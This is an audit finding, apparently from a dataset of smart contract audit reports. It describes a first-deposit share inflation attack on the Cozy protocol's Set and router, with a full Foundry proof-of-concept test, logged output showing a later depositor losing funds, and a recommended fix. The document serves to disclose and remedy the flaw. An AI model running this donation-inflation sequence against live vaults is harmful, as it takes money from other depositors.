# [H] First deposit price inflation vulnerability exists

## Summary
Severity: High
Contest weight: 0.2981
Dataset id: 5018
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Share prices are able to be manipulated upward through donating to the protocol after depositing a minuscule amount.
The documentation notes CozyRouter comes with slippage protections preventing frontrunning and limiting this particular attack. Appropriate slippage arguments in the router do accomplish this goal, however, additional off chain calculations would be needed to be effective, as the reporting from Set.convertToShares may rely on a manipulated an overly inflated price.
Although the protocol does internal accounting of incoming funds, which normally would prevent this issue, assetsExcess_ is eventually added to accounting.assetBalance; in turn, negating one of the benefits of the internal accounting. For an attacker to cause the protocol to recognize the malicious donation, a follow up deposit is needed:
• Deposit 1 wei worth of assets
• Donate a large amount using a blind transfer
• Again, deposit another 1 wei worth of assets, thus triggering the internal accounting's recognition of the donation SupplySideLib.sol#L72
Example sequence of events:
test_firstDepositFrontRun()
Initial user balances
weth.balanceOf(alice) -> 199000000000000000000
weth.balanceOf(bob) -> 199000000000000000000
alice Calling -> weth.approve(address(router), 1);
alice Calling -> router.deposit(Set(address(setETHUnderlying)), 1, alice, 0);
setETHUnderlying.totalSupply() -> 1
setETHUnderlying.totalCollateralAvailable() -> 1
setETHUnderlying.balanceOf(alice) -> 1
setETHUnderlying.balanceOfMatured(alice) -> 0
alice Calling -> weth.transfer(address(router), 2 ether);
weth.balanceOf(address(setETHUnderlying)) -> 2000000000000000001
alice Calling -> weth.approve(address(router), 1);
alice Calling -> router.deposit(Set(address(setETHUnderlying)), 1, alice, 0);
setETHUnderlying.totalSupply() -> 2
setETHUnderlying.totalCollateralAvailable() -> 2000000000000000002
setETHUnderlying.balanceOf(alice) -> 2
setETHUnderlying.balanceOfMatured(alice) -> 0
bob Calling -> weth.approve(address(router), 2 ether);
bob Calling -> router.deposit(Set(address(setETHUnderlying)), 2 ether, bob, 0);
setETHUnderlying.totalSupply() -> 3
setETHUnderlying.totalCollateralAvailable() -> 4000000000000000002
setETHUnderlying.balanceOf(alice) -> 2
setETHUnderlying.balanceOfMatured(alice) -> 0
setETHUnderlying.balanceOf(bob) -> 1
setETHUnderlying.balanceOfMatured(bob) -> 0
********Begin Redeem********
alice Calling -> setETHUnderlying.approve(address(router), 2);
weth.balanceOf(alice) -> 196999999999999999998
alice Calling -> router.redeem(Set(address(setETHUnderlying)), 2, alice, 0);
bob Calling -> setETHUnderlying.approve(address(router), 1);
weth.balanceOf(bob) -> 197000000000000000000
bob Calling -> router.redeem(Set(address(setETHUnderlying)), 1, bob, 0);
weth.balanceOf(alice) -> 199666666666666666666
setETHUnderlying.balanceOf(alice) -> 0
setETHUnderlying.balanceOfMatured(alice) -> 0
weth.balanceOf(bob) -> 198333333333333333334
setETHUnderlying.balanceOf(bob) -> 0
setETHUnderlying.balanceOfMatured(bob) -> 0
Above, the on chain response to Set.convertToShares(2 ether); is 1. If bob, in his call through the router, uses convertToShares to determine what to set minSharesReceived_ to, he will lose funds as 1 share is worth less than 2 ether due to excessive rounding.
PoC below:
```solidity
// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.18;
import {console2} from "forge-std/console2.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {ICostModel} from "src/interfaces/ICostModel.sol";
import {IDripDecayModel} from "src/interfaces/IDripDecayModel.sol";
import {IERC20} from "src/interfaces/IERC20.sol";
import {IProtectionPurchaserErrors} from "src/interfaces/IProtectionPurchaserErrors.sol";
import {IStETH} from "src/interfaces/IStETH.sol";
import {ITrigger} from "src/interfaces/ITrigger.sol";
import {IWeth} from "src/interfaces/IWeth.sol";
import {IWstETH} from "src/interfaces/IWstETH.sol";
import {AssetStorage} from "src/lib/structs/AssetStorage.sol";
import {MarketConfig, SetConfig} from "src/lib/structs/Configs.sol";
import {Fees} from "src/lib/structs/Manager.sol";
import {PurchaseFeesAssets, ExecutePurchaseData} from "src/lib/structs/Purchase.sol";
import {SaleFeesAssets, ExecuteSaleData} from "src/lib/structs/Sale.sol";
import {MathConstants} from "src/lib/MathConstants.sol";
import {MarketState} from "src/lib/StateEnums.sol";
import {CozyRouter} from "src/CozyRouter.sol";
import {Manager} from "src/Manager.sol";
import {PToken} from "src/PToken.sol";
import {Set} from "src/Set.sol";
import {MockConnector} from "test/utils/MockConnector.sol";
import {MockCostModel} from "test/utils/MockCostModel.sol";
import {MockDeployProtocol} from "test/utils/MockDeployProtocol.sol";
import {MockDripDecayModel} from "test/utils/MockDripDecayModel.sol";
import {MockERC20} from "test/utils/MockERC20.sol";
import {MockTrigger} from "test/utils/MockTrigger.sol";
import {TestBase} from "test/utils/TestBase.sol";
// ---------------------------
// -------- Multicall --------
// ---------------------------
abstract contract CozyRouterTestSetup is MockDeployProtocol {
    CozyRouter router;
    Set setETHUnderlying;
    Set set;
    IStETH stEth;
    IWstETH wstEth;
    IERC20 asset = IERC20(address(new MockERC20("Mock Asset", "MOCK", 6)));
    ITrigger trigger = ITrigger(new MockTrigger(MarketState.ACTIVE, true, true));
    address alice = address(0xABCD);
    address bob = address(0xDCBA);
    address self = address(this);
    // For calculating the per-second decay/drip rate, we use the exponential decay formula A = P * (1 - r) ^ t number of
    // elapsed seconds.
    // For example, for an annual decay rate of 25%:
    // A = P * (1 - r) ^ t
    // 0.75 = 1 * (1 - r) ^ 31557600
    // -r = 0.75^(1/31557600) - 1
    // -r = -9.116094732822280932149636651070655494101566187385032e-9
    // Multiplying r by -1e18 to calculate the scaled up per-second value required by decay/drip model constructors ~~
    // 9116094774
    uint256 constant DECAY_RATE_PER_SECOND = 9_116_094_774; // Per-second decay rate of 25%.
    /// @dev Emitted by ERC20s when `amount` tokens are moved from `from` to `to`.
    event Transfer(address indexed from, address indexed to, uint256 amount);
    function setUp() public virtual override {
        super.setUp();
        SetConfig memory setConfig_ = SetConfig(1e4, 0); // Zero deposit fee to simplify router testing.
        MarketConfig[] memory marketConfigs_ = new MarketConfig[](1);
        marketConfigs_[0] = MarketConfig({
            trigger: trigger,
            costModel: ICostModel(address(new MockCostModel(0.1e18, 0.1e18, false))),
            dripDecayModel: IDripDecayModel(new MockDripDecayModel(DECAY_RATE_PER_SECOND)),
            weight: 1e4,
            purchaseFee: 0,
            saleFee: 0
        });
        vm.prank(owner);
        manager.updateFees(Fees(0, 0, 0, 0, 0, 0)); // Zero protocol fees to simplify router testing.
        setETHUnderlying = Set(
            address(manager.createSet(owner, pauser, IERC20(address(weth)), setConfig_, marketConfigs_, _randomBytes32()))
        );
        set = Set(address(manager.createSet(owner, pauser, asset, setConfig_, marketConfigs_, _randomBytes32())));
        router = new CozyRouter(manager, weth, stEth, wstEth);
    }
}
// -------------------------------
// -------- Token Helpers --------
// -------------------------------
// Abstract test contract base with some helpers for
// manipulating WEth token balance in the Router.
abstract contract CozyWEthHelperTest is CozyRouterTestSetup {
    function dealAndDepositEth(uint128 _amount) public {
        vm.startPrank(address(router));
        vm.deal(address(router), _amount);
        weth.deposit{value: _amount}();
        assertEq(weth.balanceOf(address(router)), _amount);
        vm.stopPrank();
    }
}
contract FirstDepositPoc is CozyRouterTestSetup {
    uint256 assets = 200 ether;
    uint256 shares;
    function setUp() public override {
        super.setUp();
        // Mint some WETH and approve the router to move it.
        vm.deal(alice, assets);
        vm.deal(bob, assets);
        vm.prank(alice);
        weth.deposit{value: assets - 1 ether}();
        vm.prank(bob);
        weth.deposit{value: assets - 1 ether}();
        // // The router deposits assets on behalf of alice.
        // shares = router.deposit(setETHUnderlying, assets, testOwner, assets);
        // // Initiate a WETH withdrawal request, with bob as the receiver. The router is pre-approved.
        // setETHUnderlying.approve(address(router), shares);
        // skip(manager.minDepositDuration());
        // router.withdraw(setETHUnderlying, assets, receiver, shares);
        // skip(manager.redemptionDelay());
    }
    function test_firstDepositFrontRun() public {
        console2.log("\n\ntest_firstDepositFrontRun()");
        console2.log("Initial user balances");
        console2.log("weth.balanceOf(alice) -> %s", weth.balanceOf(alice));
        console2.log("weth.balanceOf(bob) -> %s", weth.balanceOf(bob));
        /**
        function deposit(
            Set set_,
            uint256 assets_,
            address receiver_,
            uint256 minSharesReceived_ // The minimum amount of shares the user expects to receive.
        ) external payable returns (uint256 shares_) {
        */
        vm.startPrank(alice);
        console2.log("alice Calling -> weth.approve(address(router), 1);");
        weth.approve(address(router), 1);
        console2.log("alice Calling -> router.deposit(Set(address(setETHUnderlying)), 1, alice, 0);");
        router.deposit(Set(address(setETHUnderlying)), 1, alice, 0);
        console2.log("setETHUnderlying.totalSupply() -> %s", setETHUnderlying.totalSupply());
        console2.log("setETHUnderlying.totalCollateralAvailable() -> %s", setETHUnderlying.totalCollateralAvailable());
        console2.log("setETHUnderlying.balanceOf(alice) -> %s", setETHUnderlying.balanceOf(alice));
        console2.log("setETHUnderlying.balanceOfMatured(alice) -> %s", setETHUnderlying.balanceOfMatured(alice));
        console2.log("____________________________________________________________________________________");
        console2.log("alice Calling -> weth.transfer(address(router), 2 ether);");
        weth.transfer(address(setETHUnderlying), 2 ether);
        console2.log("weth.balanceOf(address(setETHUnderlying)) -> %s", weth.balanceOf(address(setETHUnderlying)));
        console2.log("____________________________________________________________________________________");
        console2.log("alice Calling -> weth.approve(address(router), 1);");
        weth.approve(address(router), 1);
        console2.log("alice Calling -> router.deposit(Set(address(setETHUnderlying)), 1, alice, 0);");
        router.deposit(Set(address(setETHUnderlying)), 1, alice, 0);
        console2.log("setETHUnderlying.totalSupply() -> %s", setETHUnderlying.totalSupply());
        console2.log("setETHUnderlying.totalCollateralAvailable() -> %s", setETHUnderlying.totalCollateralAvailable());
        console2.log("setETHUnderlying.balanceOf(alice) -> %s", setETHUnderlying.balanceOf(alice));
        console2.log("setETHUnderlying.balanceOfMatured(alice) -> %s", setETHUnderlying.balanceOfMatured(alice));
        console2.log("____________________________________________________________________________________");
        vm.stopPrank();
        vm.startPrank(bob);
        console2.log("bob Calling -> weth.approve(address(router), 2 ether);");
        weth.approve(address(router), 2 ether);
        console2.log("bob Calling -> router.deposit(Set(address(setETHUnderlying)), 2 ether, bob, 0);");
        router.deposit(Set(address(setETHUnderlying)), 2 ether, bob, 0);
        console2.log("setETHUnderlying.totalSupply() -> %s", setETHUnderlying.totalSupply());
        console2.log("setETHUnderlying.totalCollateralAvailable() -> %s", setETHUnderlying.totalCollateralAvailable());
        console2.log("setETHUnderlying.balanceOf(alice) -> %s", setETHUnderlying.balanceOf(alice));
        console2.log("setETHUnderlying.balanceOfMatured(alice) -> %s", setETHUnderlying.balanceOfMatured(alice));
        console2.log("setETHUnderlying.balanceOf(bob) -> %s", setETHUnderlying.balanceOf(bob));
        console2.log("setETHUnderlying.balanceOfMatured(bob) -> %s", setETHUnderlying.balanceOfMatured(bob));
        console2.log("____________________________________________________________________________________");
        vm.stopPrank();
        console2.log("");
        console2.log("********Begin Redeem********");
        console2.log("");
        skip(manager.minDepositDuration());
        vm.startPrank(alice);
        /**
        function redeem(
            Set set_,
            uint256 shares_,
            address receiver_,
            uint256 minAssetsReceived_ // The minimum amount of assets the user expects to receive.
        ) external payable returns (uint256 assets_) {
        */
        console2.log("alice Calling -> setETHUnderlying.approve(address(router), 2);");
        setETHUnderlying.approve(address(router), 2);
        console2.log("weth.balanceOf(alice) -> %s", weth.balanceOf(alice));
        console2.log("alice Calling -> router.redeem(Set(address(setETHUnderlying)), 2, alice, 0);");
        router.redeem(Set(address(setETHUnderlying)), 2, alice, 0);
        skip(manager.redemptionDelay());
        router.completeWithdraw(setETHUnderlying, 0);
        vm.stopPrank();
        vm.startPrank(bob);
        console2.log("bob Calling -> setETHUnderlying.approve(address(router), 1);");
        setETHUnderlying.approve(address(router), 1);
        console2.log("weth.balanceOf(bob) -> %s", weth.balanceOf(bob));
        console2.log("bob Calling -> router.redeem(Set(address(setETHUnderlying)), 1, bob, 0);");
        router.redeem(Set(address(setETHUnderlying)), 1, bob, 0);
        skip(manager.redemptionDelay());
        router.completeWithdraw(setETHUnderlying, 1);
        vm.stopPrank();
        console2.log("weth.balanceOf(alice) -> %s", weth.balanceOf(alice));
        console2.log("setETHUnderlying.balanceOf(alice) -> %s", setETHUnderlying.balanceOf(alice));
        console2.log("setETHUnderlying.balanceOfMatured(alice) -> %s", setETHUnderlying.balanceOfMatured(alice));
        console2.log("weth.balanceOf(bob) -> %s", weth.balanceOf(bob));
        console2.log("setETHUnderlying.balanceOf(bob) -> %s", setETHUnderlying.balanceOf(bob));
        console2.log("setETHUnderlying.balanceOfMatured(bob) -> %s", setETHUnderlying.balanceOfMatured(bob));
        // vm.startPrank(bob);
        // console2.log("bob Calling -> setETHUnderlying.approve(address(router), 140000000000000000000);");
        // setETHUnderlying.approve(address(router), 140000000000000000000);
        // console2.log("weth.balanceOf(alice) -> %s", weth.balanceOf(alice));
        // console2.log("bob Calling -> router.redeem(Set(address(setETHUnderlying)), 140000000000000000000, bob, 0);");
        // router.redeem(Set(address(setETHUnderlying)), 140000000000000000000, bob, 0);
        // console2.log("weth.balanceOf(alice) -> %s", weth.balanceOf(alice));
        // console2.log("setETHUnderlying.balanceOf(alice) -> %s", setETHUnderlying.balanceOf(alice));
        // console2.log("setETHUnderlying.balanceOfMatured(alice) -> %s", setETHUnderlying.balanceOfMatured(alice));
        // console2.log("weth.balanceOf(bob) -> %s", weth.balanceOf(bob));
        // console2.log("setETHUnderlying.balanceOf(bob) -> %s", setETHUnderlying.balanceOf(bob));
        // console2.log("setETHUnderlying.balanceOfMatured(bob) -> %s", setETHUnderlying.balanceOfMatured(bob));
        // vm.stopPrank();
    }
}
```

## Recommendation
Do not add assetsExcess to accounting.assetBalance.
